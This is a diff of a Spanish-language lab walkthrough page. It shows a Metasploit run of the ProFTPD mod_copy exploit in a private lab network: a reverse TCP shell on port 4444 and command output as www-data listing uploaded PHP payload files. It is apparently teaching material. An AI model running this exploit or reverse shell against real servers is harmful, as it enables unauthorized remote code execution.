@@ -456,7 +456,7 @@ SITEPATH =&gt; /var/www/html
 
 Ejecutamos nuevamente
 
-<pre><u style="text-decoration-style:solid">sf</u> exploit(<font color="#EC0101"><b>unix/ftp/proftpd_modcopy_exec</b></font>) &gt; run
+<pre><u style="text-decoration-style:solid">msf</u> exploit(<font color="#EC0101"><b>unix/ftp/proftpd_modcopy_exec</b></font>) &gt; run
 <font color="#277FFF"><b>[*]</b></font> Started reverse TCP handler on 192.168.115.4:4444 
 <font color="#277FFF"><b>[*]</b></font> 192.168.115.3:80 - 192.168.115.3:21 - Connected to FTP server
 <font color="#277FFF"><b>[*]</b></font> 192.168.115.3:80 - 192.168.115.3:21 - Sending copy commands to FTP server
@@ -468,7 +468,20 @@ id
 /bin/sh: 11: iid: not found
 id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
+ls
+D8kCUog.php
+chat
+drupal
+eUWsY.php
+payroll_app.php
+phpmyadmin
+q3ECs.php
+pwd
+/var/www/html
+whoami
+www-data
+</pre>
 
 </pre>
-<pre><u style="text-decoration-style:solid"><A5>¡¡FELICIDADES!!</A5></u> 
+<pre><u style="text-decoration-style:solid"><A5>¡¡FELICIDADES YA LOGRASTE EXPLOTAR LA VULNERABILIDAD!!</A5></u> 
 </pre>
